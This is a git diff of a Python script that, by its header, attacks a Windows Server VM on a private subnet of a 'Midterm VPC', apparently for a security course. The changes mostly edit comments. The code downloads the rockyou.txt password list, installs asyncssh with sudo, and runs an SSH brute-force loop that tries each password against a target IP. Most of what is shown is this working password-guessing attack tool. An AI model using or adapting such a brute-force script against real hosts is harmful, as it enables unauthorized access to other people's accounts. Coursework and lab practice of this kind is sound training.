@@ -6,6 +6,11 @@
 # Purpose:                      Create a python script:
 # Attack Windows Server VM on private subnet of Midterm VPC
 
+
+# Confirm Python is installed, confirm correct configuration and version/paths/environments.
+# Root access may be required
+
+
 import subprocess
 import asyncio
 import urllib.request
@@ -13,16 +18,16 @@ import urllib.request
 # URL to download rockyou.txt
 ROCKY_URL = "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
 
-# Local path to rockyou.txt (if download fails)
+# Local path to rockyou.txt
 LOCROC_PATH = "/path/to/rockyou.txt"
 
-# Attempt to install asyncssh library
+# Install asyncssh library
 try:
     import asyncssh
 except ImportError:
     subprocess.run(["sudo", "pip", "install", "asyncssh"])
 
-# Attempt to download rockyou.txt
+# Download rockyou.txt
 wordlist_path = LOCROC_PATH
 try:
     urllib.request.urlretrieve(ROCKY_URL, "rockyou.txt")
@@ -43,11 +48,10 @@ async def try_login(ip_address, username, password):
 async def SSHBrute(file_path, ip_address, username):
     with open(file_path, 'r') as file:
         for line in file:
-            password = line.strip()  # remove newline characters
+            password = line.strip()
             success = await try_login(ip_address, username, password)
             if success:
                 return
-            # Add a delay if needed (in seconds)
             await asyncio.sleep(1)
     print("No successful login found.")
 
